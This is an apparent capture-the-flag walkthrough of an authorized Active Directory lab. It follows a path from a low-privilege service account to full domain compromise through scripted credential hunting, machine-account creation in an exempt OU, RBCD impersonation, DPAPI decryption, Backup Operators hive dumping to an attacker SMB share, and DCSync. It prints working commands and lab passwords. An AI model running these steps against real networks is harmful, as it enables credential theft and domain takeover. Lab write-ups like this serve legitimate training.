# NorthBridge Systems

**Difficulty:** Hard  
**Category:** Active Directory  
**Techniques:** Credential hunting in scripts/shares, DPAPI secret decryption, machine account quota (MAQ) OU bypass, Resource-Based Constrained Delegation (RBCD), local admin impersonation, Backup Operators abuse, DCSync

## TL;DR

Starting from a low-privilege service account, RDP access and share browsing on a jump host (`NORTHJMP01`) turned up hardcoded credentials for a second service account, `_svrautomationsvc`, inside a backup script. That account had `WriteAccountRestrictions` on the jump host, normally enough to add a domain-joined computer and set up delegation, but the domain's machine account quota had been set to 0. A PingCastle report found on the share revealed one OU, `ServerProvisioning`, was excluded from that restriction, allowing a computer account to be created there instead. From that computer account, a Resource-Based Constrained Delegation (RBCD) attack targeted the jump host, but impersonating the domain Administrator failed since that account is a Protected User. Impersonating a member of the jump host's local admin group instead worked, adding one of the service accounts to local Administrators and gaining full control of `NORTHJMP01`. From there, `secretsdump` pulled local hashes, and a DPAPI secret extraction recovered cleartext credentials for `_backupsvc`, a member of Backup Operators on the domain controller. That membership allowed dumping SAM/SYSTEM/SECURITY/NTDS remotely, recovering the domain controller's own machine account hash, `NORTHDC01$`. Since machine accounts have default replication rights, that hash was used to DCSync the built-in Administrator account (RID 500), whose NTLM hash remains usable for authentication even though it's marked non-delegable, completing full domain compromise.

## Full Walkthrough

### Starting Credentials

```
_securitytestingsvc:4kCc$A@NZvNAdK@
```

### Enumeration: NORTHDC01

![northbridge-systems screenshot 1](images/northbridge-systems/northbridge-systems-01.png)

![northbridge-systems screenshot 2](images/northbridge-systems/northbridge-systems-02.png)

![northbridge-systems screenshot 3](images/northbridge-systems/northbridge-systems-03.png)

Double-checking shares:

![northbridge-systems screenshot 4](images/northbridge-systems/northbridge-systems-04.png)

Checking SYSVOL:

![northbridge-systems screenshot 5](images/northbridge-systems/northbridge-systems-05.png)

![northbridge-systems screenshot 6](images/northbridge-systems/northbridge-systems-06.png)

Something worth keeping in mind for later.

**BloodHound enumeration** with `bloodhound-ce-python`:

![northbridge-systems screenshot 7](images/northbridge-systems/northbridge-systems-07.png)

Analyzing it:

![northbridge-systems screenshot 8](images/northbridge-systems/northbridge-systems-08.png)

No outbound object control. Kerberoasting:

![northbridge-systems screenshot 9](images/northbridge-systems/northbridge-systems-09.png)

ASREPRoasting:

![northbridge-systems screenshot 10](images/northbridge-systems/northbridge-systems-10.png)

**User enumeration:**

![northbridge-systems screenshot 11](images/northbridge-systems/northbridge-systems-11.png)

Building a user list. RDP and WinRM both fail with the starting credentials.

### Enumeration: NORTHJMP01

![northbridge-systems screenshot 12](images/northbridge-systems/northbridge-systems-12.png)

Checking shares:

![northbridge-systems screenshot 13](images/northbridge-systems/northbridge-systems-13.png)

"Network Shares":

![northbridge-systems screenshot 14](images/northbridge-systems/northbridge-systems-14.png)

`/archive/backup.bat` contains credentials:

![northbridge-systems screenshot 15](images/northbridge-systems/northbridge-systems-15.png)

```
_backupautomation : 1rUlHB95TVA2I&BCve
```

`/security/PingCastle`:

![northbridge-systems screenshot 16](images/northbridge-systems/northbridge-systems-16.png)

Two documents stand out: an AD self-assessment PDF,

![northbridge-systems screenshot 17](images/northbridge-systems/northbridge-systems-17.png)

and a PingCastle manual.

![northbridge-systems screenshot 18](images/northbridge-systems/northbridge-systems-18.png)

`/security/sm`:

![northbridge-systems screenshot 19](images/northbridge-systems/northbridge-systems-19.png)

References [SpecterOps' "Certified Pre-Owned" research](https://specterops.io/blog/2021/06/17/certified-pre-owned/#7271). `/Service Desk`:

![northbridge-systems screenshot 20](images/northbridge-systems/northbridge-systems-20.png)

![northbridge-systems screenshot 21](images/northbridge-systems/northbridge-systems-21.png)

![northbridge-systems screenshot 22](images/northbridge-systems/northbridge-systems-22.png)

Two temporary reset passwords turn up:

```
ChangeMe@Northbridge!!
NewP@ssword123
```

`/Wintel Engineering`:

![northbridge-systems screenshot 23](images/northbridge-systems/northbridge-systems-23.png)

Three different passwords collected so far:

```
1rUlHB95TVA2I&BCve
ChangeMe@Northbridge!!
NewP@ssword123
```

Worth spraying them against the known user list in case someone reset their password without changing it. CrackMapExec:

![northbridge-systems screenshot 24](images/northbridge-systems/northbridge-systems-24.png)

No match for `ChangeMe@Northbridge!!`.

![northbridge-systems screenshot 25](images/northbridge-systems/northbridge-systems-25.png)

No match for `NewP@ssword123`.

![northbridge-systems screenshot 26](images/northbridge-systems/northbridge-systems-26.png)

No match for `1rUlHB95TVA2I&BCve` either.

### RDP Access as _securitytestingsvc

Trying RDP directly with the starting credentials:

![northbridge-systems screenshot 27](images/northbridge-systems/northbridge-systems-27.png)

Access confirmed.

**Enumeration:** `tree /f`:

![northbridge-systems screenshot 28](images/northbridge-systems/northbridge-systems-28.png)

`whoami /all`:

![northbridge-systems screenshot 29](images/northbridge-systems/northbridge-systems-29.png)

`C:\`:

![northbridge-systems screenshot 30](images/northbridge-systems/northbridge-systems-30.png)

`/scripts/AD Domain Backup` looks interesting:

![northbridge-systems screenshot 31](images/northbridge-systems/northbridge-systems-31.png)

A hardcoded password turns up, converted to a secure string with PowerShell. Worth checking whether it can be restored to cleartext:

![northbridge-systems screenshot 32](images/northbridge-systems/northbridge-systems-32.png)

### Access as _svrautomationsvc

`/Server Build Automation`:

![northbridge-systems screenshot 33](images/northbridge-systems/northbridge-systems-33.png)

Credentials recovered:

```
_svrautomationsvc : yf0@EoWY4cXqmVv
```

Testing them with `nxc smb`:

![northbridge-systems screenshot 34](images/northbridge-systems/northbridge-systems-34.png)

![northbridge-systems screenshot 35](images/northbridge-systems/northbridge-systems-35.png)

`_svrautomationsvc` holds `WriteAccountRestrictions` on `NORTHJMP01`. Checking what that enables:

![northbridge-systems screenshot 36](images/northbridge-systems/northbridge-systems-36.png)

It allows adding a computer account, configuring delegation, and impersonating an admin through it.

### Adding a New Domain-Joined Computer

Adding a computer with `impacket-addcomputer`:

```
impacket-addcomputer -method LDAPS -computer-name "ZULEMA$" -computer-pass "zulema123\!" northbridge.corp/_svrautomationsvc:"yf0@EoWY4cXqmVv" -domain-netbios northbridge.corp -dc-host NORTHDC01.NORTHBRIDGE.CORP
```

![northbridge-systems screenshot 37](images/northbridge-systems/northbridge-systems-37.png)

Machine quota exceeded. Checking the machine account quota:

```
nxc ldap ... -M maq
```

![northbridge-systems screenshot 38](images/northbridge-systems/northbridge-systems-38.png)

That module misbehaves, so checking with BloodyAD instead:

```
bloodyad -d northbridge.corp -u _svrautomationsvc -p "yf0@EoWY4cXqmVv" --host 10.1.46.251 get object 'DC=northbridge,DC=corp' --attr ms-DS-MachineAccountQuota
```

![northbridge-systems screenshot 39](images/northbridge-systems/northbridge-systems-39.png)

The quota is 0. This matches something read earlier on the `/security/sm` share:

![northbridge-systems screenshot 40](images/northbridge-systems/northbridge-systems-40.png)

The quota was deliberately set from 10 to 0, so a computer account can't be added domain-wide. Trying RDP as `_svrautomationsvc`:

![northbridge-systems screenshot 41](images/northbridge-systems/northbridge-systems-41.png)

Running PingCastle to see what else turns up:

![northbridge-systems screenshot 42](images/northbridge-systems/northbridge-systems-42.png)

No write access to that directory. Creating a `/temp` folder instead: transferring the zip, expanding it with `Expand-Archive`, and re-running PingCastle:

![northbridge-systems screenshot 43](images/northbridge-systems/northbridge-systems-43.png)

Done. Reviewing the HTML report in Edge:

![northbridge-systems screenshot 44](images/northbridge-systems/northbridge-systems-44.png)

Nothing immediately useful there. Back to enumerating manually. Reviewing `/Scripts` again:

![northbridge-systems screenshot 45](images/northbridge-systems/northbridge-systems-45.png)

`Password.txt` contains a DPAPI-encrypted blob generated with `ConvertFrom-SecureString`, bound to the user and system that created it. It can only be decrypted within the appropriate DPAPI context, or with the corresponding DPAPI keys, meaning:

![northbridge-systems screenshot 46](images/northbridge-systems/northbridge-systems-46.png)

Without the context of `_backupsvc`, it can't be decrypted yet. Trying to run the related script:

![northbridge-systems screenshot 47](images/northbridge-systems/northbridge-systems-47.png)

Fails with an invalid key. Something else stands out:

![northbridge-systems screenshot 48](images/northbridge-systems/northbridge-systems-48.png)

This script is triggered by an automated task scheduler process.

![northbridge-systems screenshot 49](images/northbridge-systems/northbridge-systems-49.png)

![northbridge-systems screenshot 50](images/northbridge-systems/northbridge-systems-50.png)

If it runs, a new local admin gets created:

```
NorthBridgeAdmin : Admin!123
```

But it can't be triggered directly.

![northbridge-systems screenshot 51](images/northbridge-systems/northbridge-systems-51.png)

`_svrautomationsvc` exceeded the domain-wide machine account quota, but that restriction may not apply inside a specific OU:

![northbridge-systems screenshot 52](images/northbridge-systems/northbridge-systems-52.png)

The OU in question is `ServerProvisioning`. Validating this with `impacket-dacledit`:

```
impacket-dacledit 'northbridge/_securitytestingsvc:4kCc$A@NZvNAdK@' -dc-ip 10.1.46.251 -principal _svrautomationsvc -target-dn OU=ServerProvisioning,OU=Servers,DC=northbridge,DC=corp -action read
```

![northbridge-systems screenshot 53](images/northbridge-systems/northbridge-systems-53.png)

Access allowed. Adding a machine again, this time scoped to that OU with BloodyAD:

```
bloodyad -u _svrautomationsvc -p "yf0@EoWY4cXqmVv" --dc-ip 10.1.46.251 -d northbridge.corp add computer "ZULEMA" "zulema123?" --ou OU=ServerProvisioning,OU=Servers,DC=northbridge,DC=corp
```

![northbridge-systems screenshot 54](images/northbridge-systems/northbridge-systems-54.png)

![northbridge-systems screenshot 55](images/northbridge-systems/northbridge-systems-55.png)

Computer created. Confirming:

![northbridge-systems screenshot 56](images/northbridge-systems/northbridge-systems-56.png)

BloodHound's suggested next step:

![northbridge-systems screenshot 57](images/northbridge-systems/northbridge-systems-57.png)

### RBCD Attack (Resource-Based Constrained Delegation)

Configuring delegation with `impacket-rbcd`:

```
impacket-rbcd -delegate-from 'ZULEMA$' -delegate-to 'NORTHJMP01$' -action 'write' 'northbridge.corp/_svrautomationsvc:yf0@EoWY4cXqmVv' -dc-ip 10.1.46.251
```

![northbridge-systems screenshot 58](images/northbridge-systems/northbridge-systems-58.png)

![northbridge-systems screenshot 59](images/northbridge-systems/northbridge-systems-59.png)

Requesting a Service Ticket to impersonate the target admin with `impacket-getST`:

```
impacket-getST -spn 'cifs/NORTHJMP01.northbridge.corp' -impersonate 'Administrator' 'northbridge.corp/ZULEMA$:zulema123?'
```

![northbridge-systems screenshot 60](images/northbridge-systems/northbridge-systems-60.png)

This fails because the domain Administrator is a Protected User, marked as "sensitive and cannot be delegated." A different target is needed: a local administrator rather than the domain one. Inspecting groups:

![northbridge-systems screenshot 61](images/northbridge-systems/northbridge-systems-61.png)

`NorthJMP01Priv` stands out. Checking what it's for:

![northbridge-systems screenshot 62](images/northbridge-systems/northbridge-systems-62.png)

It grants local administrator access on `NORTHJMP01`. Confirming via `localgroup Administrators`:

![northbridge-systems screenshot 63](images/northbridge-systems/northbridge-systems-63.png)

`NorthJMP01Priv` is indeed a member. The group itself contains `gcookT1`, `mleeT1`, `rhallT1`, and `smccormickT1`. Trying to impersonate one of them:

![northbridge-systems screenshot 64](images/northbridge-systems/northbridge-systems-64.png)

`smccormickT1` impersonated successfully. Exporting the ticket:

![northbridge-systems screenshot 65](images/northbridge-systems/northbridge-systems-65.png)

Without interactive access yet, the plan is to add one of the controlled service accounts to the local Administrators group:

```
nxc smb NORTHJMP01 -k --use-kcache -u smccormickT1 -d northbridge.corp -x "net localgroup Administrators _securitytestingsvc@northbridge.corp /add"
```

![northbridge-systems screenshot 66](images/northbridge-systems/northbridge-systems-66.png)

Trying via WMI instead:

![northbridge-systems screenshot 67](images/northbridge-systems/northbridge-systems-67.png)

Executed successfully. RDP:

![northbridge-systems screenshot 68](images/northbridge-systems/northbridge-systems-68.png)

### NORTHJMP01 Pwned

**Secretsdump:** with local admin confirmed, dumping local secrets:

```
impacket-secretsdump northbridge.corp/_securitytestingsvc@10.1.105.181
```

![northbridge-systems screenshot 69](images/northbridge-systems/northbridge-systems-69.png)

A set of hashes comes back, including one for the local Administrator.

### DPAPI: Extracting _backupsvc's Password

Recalling the DPAPI-protected credential seen earlier for `_backupsvc`, now that Administrator privileges are available, it should be decryptable. Trying `nxc smb -M dpapi_hash`:

```
nxc smb 10.1.105.181 -u _securitytestingsvc -p "4kCc\$A@NZvNAdK@" -M dpapi_hash
```

![northbridge-systems screenshot 70](images/northbridge-systems/northbridge-systems-70.png)

This only dumps the master keys. Using NetExec's `--dpapi` flag instead:

```
netexec smb northjmp01 -u _securitytestingsvc -p "4kCc\$A@NZvNAdK@" --dpapi
```

![northbridge-systems screenshot 71](images/northbridge-systems/northbridge-systems-71.png)

The cleartext password comes back:

```
_backupsvc : j0$QyPZ0JWzN2*iu^5
```

### Backup Operators Exploit on DC01

![northbridge-systems screenshot 72](images/northbridge-systems/northbridge-systems-72.png)

`_backupsvc` is a member of Backup Operators, which allows reading SAM and SYSTEM remotely. Using `impacket-reg`, starting with an SMB server to receive the output:

![northbridge-systems screenshot 73](images/northbridge-systems/northbridge-systems-73.png)

Running the dump:

```
impacket-reg northbridge.corp/_backupsvc:"j0\$QyPZ0JWzN2*iu^5"@northdc01 backup -o //10.200.75.57/hello
```

![northbridge-systems screenshot 74](images/northbridge-systems/northbridge-systems-74.png)

SAM saves successfully, but SYSTEM doesn't come through.

![northbridge-systems screenshot 75](images/northbridge-systems/northbridge-systems-75.png)

Trying a different approach for SYSTEM:

![northbridge-systems screenshot 76](images/northbridge-systems/northbridge-systems-76.png)

That doesn't resolve it either. Switching tools entirely, to `nxc smb -M backup_operator`:

```
nxc smb northdc01 -u _backupsvc -p "j0\$QyPZ0JWzN2*iu^5" -M backup_operator
```

![northbridge-systems screenshot 77](images/northbridge-systems/northbridge-systems-77.png)

This works cleanly, pulling SAM, SYSTEM, SECURITY, and NTDS all at once. Running `impacket-secretsdump` locally against the saved files for a full parse:

![northbridge-systems screenshot 78](images/northbridge-systems/northbridge-systems-78.png)

The `$MACHINE.ACC` hash comes out of this, the `NORTHDC01$` machine account hash. Verifying it with CrackMapExec:

![northbridge-systems screenshot 79](images/northbridge-systems/northbridge-systems-79.png)

### Full Domain Compromise: DCSync

The `NORTHDC01$` machine account can run a DCSync attack because domain controllers hold replication privileges by default, letting them request password hashes from Active Directory. DCSync can retrieve the NTLM hash of Protected Users too, but that hash can't be used for pass-the-hash or other NTLM-based lateral movement, since Protected Users have NTLM authentication disabled outright.

The built-in **Administrator** account (RID 500) is the better target here: its NTLM hash remains usable for authentication, since "account is sensitive and cannot be delegated" only restricts Kerberos delegation, not NTLM.

Requesting just that account via DCSync:

```
impacket-secretsdump -just-dc-user Administrator ...
```

![northbridge-systems screenshot 80](images/northbridge-systems/northbridge-systems-80.png)

![northbridge-systems screenshot 81](images/northbridge-systems/northbridge-systems-81.png)

![northbridge-systems screenshot 82](images/northbridge-systems/northbridge-systems-82.png)

### NORTHDC01 Pwned

---

*Educational write-up from an authorized lab environment (HackSmarter). Not a guide for unauthorized access.*
